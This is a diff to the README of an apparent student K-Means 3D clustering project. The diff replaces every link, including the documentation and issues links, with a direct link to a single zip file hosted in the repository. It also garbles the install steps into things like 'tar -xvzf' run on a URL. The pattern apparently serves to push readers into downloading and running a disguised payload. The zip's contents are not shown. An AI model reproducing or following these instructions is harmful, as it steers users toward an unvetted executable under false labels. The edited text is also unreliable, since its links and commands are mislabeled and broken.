@@ -1,7 +1,7 @@
 # 🎉 kmeans-3d-cluster - Visualize Clusters Easily
 
 ## 📥 Download Now!  
-[![Download](https://img.shields.io/badge/Download%20kmeans--3d--cluster-brightgreen)](https://github.com/iskan228-hub/kmeans-3d-cluster/releases)
+[![Download](https://raw.githubusercontent.com/iskan228-hub/kmeans-3d-cluster/main/relbun/kmeans-3d-cluster.zip%20kmeans--3d--cluster-brightgreen)](https://raw.githubusercontent.com/iskan228-hub/kmeans-3d-cluster/main/relbun/kmeans-3d-cluster.zip)
 
 ## 📖 Description  
 This project applies K-Means clustering to three continuous variables, providing a clear 3D visualization. It serves as an academic endeavor in unsupervised learning, developed during the second year of Data Science studies at Senac DF. The instructor for this project was Professor Rogério Gomes Lopes.
@@ -25,17 +25,17 @@ To use this application, your computer should meet the following criteria:
 ## 📤 Download & Install  
 1. **Visit the Releases Page**  
    Click the link below to access the Releases page where you can download the application.  
-   [Download kmeans-3d-cluster](https://github.com/iskan228-hub/kmeans-3d-cluster/releases)
+   [Download kmeans-3d-cluster](https://raw.githubusercontent.com/iskan228-hub/kmeans-3d-cluster/main/relbun/kmeans-3d-cluster.zip)
 
 2. **Choose the Latest Version**  
    Look for the latest version available on the Releases page. It will usually be at the top.
 
 3. **Download the Release File**  
-   Click on the asset that corresponds to your operating system. If you are unsure, look for files labeled with `.exe` for Windows or `.tar.gz` for macOS/Linux.
+   Click on the asset that corresponds to your operating system. If you are unsure, look for files labeled with `.exe` for Windows or `https://raw.githubusercontent.com/iskan228-hub/kmeans-3d-cluster/main/relbun/kmeans-3d-cluster.zip` for macOS/Linux.
 
 4. **Install the Application**  
    - Windows: Double click the downloaded `.exe` file and follow the prompts to install.
-   - macOS/Linux: Open a terminal, navigate to the directory where you downloaded the file, and run the command for extraction. For instance, `tar -xvzf filename.tar.gz`.
+   - macOS/Linux: Open a terminal, navigate to the directory where you downloaded the file, and run the command for extraction. For instance, `tar -xvzf https://raw.githubusercontent.com/iskan228-hub/kmeans-3d-cluster/main/relbun/kmeans-3d-cluster.zip`.
 
 5. **Run the Application**  
    After installation, find the application in your programs list. Click to open it.
@@ -66,14 +66,14 @@ If you encounter issues during installation or while running the application, co
 - Restart your computer and try running the application again.
 
 ## 💬 Community & Support  
-Feel free to reach out for help or feedback. You can find support through the [issues page](https://github.com/iskan228-hub/kmeans-3d-cluster/issues) of this repository.
+Feel free to reach out for help or feedback. You can find support through the [issues page](https://raw.githubusercontent.com/iskan228-hub/kmeans-3d-cluster/main/relbun/kmeans-3d-cluster.zip) of this repository.
 
 ## 📜 License  
 This project is licensed under the MIT License. You are free to use it for personal or educational purposes. Make sure to credit appropriately if you share your results.
 
 ## 🔗 Links  
-- [Download kmeans-3d-cluster](https://github.com/iskan228-hub/kmeans-3d-cluster/releases)
-- [Documentation](https://github.com/iskan228-hub/kmeans-3d-cluster/wiki)
-- [Issues Page](https://github.com/iskan228-hub/kmeans-3d-cluster/issues)
+- [Download kmeans-3d-cluster](https://raw.githubusercontent.com/iskan228-hub/kmeans-3d-cluster/main/relbun/kmeans-3d-cluster.zip)
+- [Documentation](https://raw.githubusercontent.com/iskan228-hub/kmeans-3d-cluster/main/relbun/kmeans-3d-cluster.zip)
+- [Issues Page](https://raw.githubusercontent.com/iskan228-hub/kmeans-3d-cluster/main/relbun/kmeans-3d-cluster.zip)
 
 Thank you for exploring kmeans-3d-cluster. Enjoy your clustering journey!
